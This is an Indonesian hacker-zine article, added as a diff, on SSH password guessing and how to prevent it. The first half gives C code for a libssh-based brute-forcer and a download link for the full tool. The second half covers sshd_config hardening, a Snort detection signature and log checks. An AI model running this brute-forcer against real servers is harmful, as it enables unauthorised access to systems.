@@ -1,0 +1,263 @@
+####################################################################
+TOKET - Terbitan Online Kecoak Elektronik
+Defending the classical hackers mind since 1995
+
+Publisher : http://www.kecoak-elektronik.net
+Contact	  : staff@kecoak-elektronik.net
+####################################################################
+
+
+Subject	  : SSH Password Guessing dan Tindakan Prevention
+Writer	  : Ph03n1X of Kecoak Elektronik
+Contact   : phoenix@kecoak-elektronik.net
+Style     : Unicode Transformation Format (UTF-8)
+
+
+--[1]-- Kecoak Elektronik License
+
+Kecoak Elektronik secara aktif mendukung Blue Ribbon Campaign.
+Kami akan berusaha untuk menerbitkan semua informasi yang kami anggap
+patut diketahui, baik dokumen teks, artikel majalah, atau surat kabar.
+Seluruh kredit akan diberikan kepada sang pengarang.
+
+Kecoak Elektronik tidak bertanggung jawab atas tindakan orang lain.
+Informasi yang disajikan di situs ini adalah untuk tujuan pendidikan
+dan informasionil belaka. Jika anda memutuskan untuk mengejawantahkan
+dalam bentuk apapun informasi yang tersimpan di situs ini, anda
+melakukan atas keputusan sendiri, dan tidak seorangpun selain anda
+bertanggung jawab atas tindakan tersebut.
+
+Dipersilahkan untuk mengambil sebagian atau seluruh dari isi artikel
+yang kami terbitkan dengan tetap mencantumkan kredit atas pengarang
+dan Kecoak Elektronik sebagai penerbit online. Artikel yang dikutip
+atau diambil tidak dapat dipergunakan untuk kepentingan komersil.
+
+
+--[2]-- Intro
+
+SSH merupakan standar remote login yang biasa digunakan mesin - mesin
+Linux/Unix sebagai pengganti telnet dan r* base login. Banyak sekali
+software - software yang mensupport penggunaan remote login via SSH ini
+misalnya: OpenSSH, LSH, dan FreeSSH. Pembahasan di artikel ini
+menggunakan OpenSSH server sebagai mesin target. Proses Autentikasi
+SSH bisa menggunakan user/password atau autentikasi RSA publik/private 
+key. User dan password sejak dulu selalu menjadi bagian yang selalu 
+diincar oleh seorang yang berniat mengintrusi jaringan. Banyak sekali
+user dari sebuah mesin unix yang menggunakan password-password lemah
+sehingga menjadi jalan masuk tersendiri bagi seorang intruder. Nah
+tulisan ini membahas bagaimana merakit sendiri script untuk melakukan
+guessing ssh password serta usaha-usaha meminimalkan resiko SSH
+password guessing.
+
+
+--[3]-- Requirement
+
+SSH brute force yang hendak dibuat membutuhkan header-header file yang 
+ada di libssh, sehingga untuk mengkompile dan menggunakan ssh brute force 
+kita terlebih dahulu harus melengkapi mesin kita dengan libssh ini.
+Source libssh saya lampirkan bersama source SSH brute force yang saya 
+kompress dalam bentuk .tgz (Link saya berikan diakhir artikel). berikut
+ini proses instalasi libssh nya
+
+-----------------------------------------------------------------------
+tar zxvf libssh-0.1.tgz
+cd libssh-0.1
+./configure --prefix=/home/kaiten/ilssh (prefix terserah anda)
+make
+make install
+cp /home/kaiten/ilssh/lib/* /usr/lib
+cp -rf /home/kaiten/ilssh/inc/libssh /usr/include/
+-----------------------------------------------------------------------
+
+Requirement lain seperti mesin unix, kompiler gcc dan lainnya saya pikir 
+sudah cukup jelas!
+
+
+--[4]-- SSH Brute Force
+
+Saya harap istilah brute force dan password guessing tidak perlu
+dipermasalahkan OK!, sebenarnya lebih tepat kalo dibilang password
+guessing karena seorang intruder harus membuat dictionary yang berisi
+daftar kemungkinan user dan password. 
+
+Beberapa fungsi di libssh yang digunakan oleh ssh brute force ini adalah 
+ssh_getopt(), options_set_username(), options_set_host(),
+options_set_port(), ssh_connect(), ssh_userauth_password(), dan
+ssh_disconnect(). Deklarasi fungsi-fungsi ini ada di file header di
+/usr/include/libssh/libssh.h seperti berikut yang hanya ditampilkan
+bagian yang perlu saja dari libssh.h
+
+-----------------------------------------------------------------------
+#define AUTH_SUCCESS 0
+
+/* in client.c */
+
+SSH_SESSION *ssh_connect(SSH_OPTIONS *options);
+void ssh_disconnect(SSH_SESSION *session);
+
+/* in options.c */
+
+SSH_OPTIONS *ssh_getopt(int *argcptr, char **argv);
+void options_set_username(SSH_OPTIONS *opt,char *username);
+void options_set_host(SSH_OPTIONS *opt, const char *host);
+void options_set_port(SSH_OPTIONS *opt, unsigned int port);
+
+/* in auth.c */
+
+int ssh_userauth_password(SSH_SESSION *session,char *username,char *password);
+-----------------------------------------------------------------------
+
+Lengkapnya baca sendiri file libssh.h serta file - file *.c yang
+dibutuhkan. Nahh, sekarang tinggal mengimplementasikan fungsi-fungsi
+diatas pada ssh brute force yang akan kita rakit codenya.
+Logika sederhananya seperti berikut ini.
+
+-----------------------------------------------------------------------
+#include <libssh/libssh.h>
+#include <libssh/sftp.h>
+#define PORT 22
+
+void checkauth(char *user, char *password, char *host)
+{
+  SSH_SESSION *session;
+  SSH_OPTIONS *options;
+  int argc=1;
+  char *argv[]={"none"};
+
+  options=ssh_getopt(&argc,argv);
+  options_set_username(options,user);
+  options_set_host(options,host);
+  options_set_port(options,PORT);
+  session=ssh_connect(options);
+  if(!session) return ;
+
+  if(ssh_userauth_password(session,NULL,password) != AUTH_SUCCESS)
+  {
+          printf("%s:%s:%s -> BaD Password\n",user,password,host);
+          ssh_disconnect(session);
+          return;
+  }else{
+          printf("%sOk.TRY This : %s:%s:%s\n",warn,user,password,host);
+  }
+}
+-----------------------------------------------------------------------
+
+Mudah-mudahan, code pendek diatas membuat anda mengerti bagaimana
+SSH brute force bekerja. Code lengkap ssh brute forcenya silakan
+download di http://kecoak-elektronik.net/download/sshbrute.tgz
+Sebelum digunakan ada baiknya anda mengcustomize codenya sesuai
+kebutuhan anda. Cara menggunakannya: Susunlah sebuah file berisi
+list password (saya menyertakan sebuah contoh file 'listnew'),
+extract file sshbrute.tgz. Install libssh-0.1.tgz ke mesin anda,
+kompile sshbrute.c dan mainkan pake jari-jemari anda.
+
+
+--[5] Tindakan Preventif (OpenSSH)
+
+Tindakan preventif bisa diterapkan mulai dari konfigurasi sshd_config
+sampai dengan pembuatan signature IDS. Berikut ini beberapa hal yang 
+harus anda perhatikan untuk meminimalkan resiko ssh brute force.
+
+Konfigurasi sshd_config, bahasan disini hanya bagian yang digunakan
+untuk meminimalkan terjadinya ssh guessing password dan bukan
+mengaman kan SSH secara global.
+
+# Logging authentikasi ke syslog
+SyslogFacility AUTH
+
+# Batasi jumlah percobaan login maximum
+# Nantinya anda akan mengerti hal ini tidak banyak membantu :D
+MaxAuthTries 3
+
+# Jangan izinkan remote root login lewat SSH
+# Biasanya user yang dipake brute force adalah root ;)
+PermitRootLogin no
+
+# Jika usernya cuma anda saja, ada baiknya tidak menggunakan
+# authentikasi password, gunakan RSA authentikasi saja
+# Disable login menggunakan password
+RSAAuthentication yes # SSH 1
+PubkeyAuthentication yes #SSH 2
+AuthorizedKeysFile     .ssh/authorized_keys
+
+# Jangan izinkan login tanpa password
+PermitEmptyPasswords no
+
+
+Jika anda merasa server anda sangat penting, atur traffic incomming
+ke port SSH hanya dari host - host lokal jaringan yang terpercaya.
+Bisa dilakukan dari /etc/host.deny atau firewall. Namun jika
+ternyata anda sewaktu-waktu membutuhkan login dari luar jaringan
+lokal, anda bisa menggunakan tools semacam port knocking agar
+traffic incomming ke port SSH hanya diizinkan saat anda butuh saja.
+Atur password anda agar tidak mudah di tebak orang lain.
+
+Cara diatas efektif jika user yang ada disistem hanya anda saja,
+Bagaimana jika user dimesin anda cukup banyak...?? Salah satu
+alternatif yang saya tawarkan adalah dengan membangun
+Intrussion Prevention System (IPS) di host anda. Ingat jangan
+dilakukan di router atau mesin gateway karena IPS bisa membuat
+jaringan anda jauh dari fleksible dan salah-salah service publik
+yang anda tawarkan menjadi tidak berguna karena autoblocking IPS.
+
+Jika anda cukup malas membangun IPS di masing-masing host karena
+banyaknya jumlah host, bangunlan sebuah Network Intrussion
+Detection System (NIDS) di mesin gateway/router anda. Ingat
+sebaiknya hanya 'detection' saja kalau dibangun di router/gateway.
+Berikut sebuah snort signature yang biasa saya gunakan untuk
+mendeteksi ssh brute force.
+
+var HOST 222.124.24.8
+var PORT 22
+include classification.config
+alert tcp any any -> $HOST $PORT (msg: "Potential SSH Brute Force"; flags: S;\
+flowbits: set,ssh.brute.attempt; threshold: type threshold, track by_src, \
+count 5, seconds 120; classtype: attempted-recon; )
+
+Lakukan pengecekan terhadap usaha-usaha login menggunakan perintah
+'lastb' dan jangan lupa lihat file log authentikasi user. Contoh di
+OpenBSD.
+
+anto@kaiten# cat /etc/syslog.conf |grep auth
+*.notice;auth,authpriv,cron,ftp,kern,lpr,mail,user.none /var/log/messages
+auth.info                                               /var/log/authlog
+authpriv.debug                                          /var/log/secure
+#*.err;auth.notice;authpriv.none;kern.debug;mail.crit   /dev/console
+# as well as all authentication messages sent to root.
+#*.notice;auth.debug                                    root
+#*.notice;auth,authpriv,cron,ftp,kern,lpr,mail,user.none        @loghost
+#auth,daemon,syslog,user.info;authpriv,kern.debug               @loghost
+
+Bisa anda lihat informasi log authentikasi ada di /var/log/authlog,
+/var/log/secure, dan ada baiknya anda juga melakukan pengecekan file
+/var/log/messages. Jika anda cukup paranoid lakukan backup berkala
+terhadap file-file log dan kirimkan ke mesin lain. 
+
+Saya kira seperti itu tindakan preventif yang bisa dilakukan sysadmin
+untuk mengurangi resiko SSH Brute Force.
+
+
+--[6]-- Penutup
+
+Bagi seorang intruder banyak sekali cara untuk melewati sekuritas yang
+sudah diterapkan di sebuah jaringan. Sehingga seorang sysadmin dituntut
+untuk selalu update informasi sekuritas (apalagi kalau gaji gede semangat
+dong ahh.. :D). Desain sekuritas sebuah jaringan dan host harus bisa meng
+optimalkan antara sekuritas dan service. Jangan sampai terlalu paranoid
+sehingga service publik malah ga ada yang bisa dimanfaatkan, jangan
+sampai terlalu teledor sehingga mesin/jaringan anda di kompromise dan
+service diacak-acak intruder.
+
+
+--[7]-- Referensi
+
+1. SSH Brute Force Zorg of texter - www.wget.home.ro
+2. Manual pages sshd_config
+3. Snort Documentation
+
+
+
+Ph03n1X <phoenix@kecoak-elektronik.net>
+-----------------------------------------------------------------------
+Copyleft Unreserved by Law 1995 - 2007 Kecoak Elektronik Indonesia
+http://www.kecoak-elektronik.net
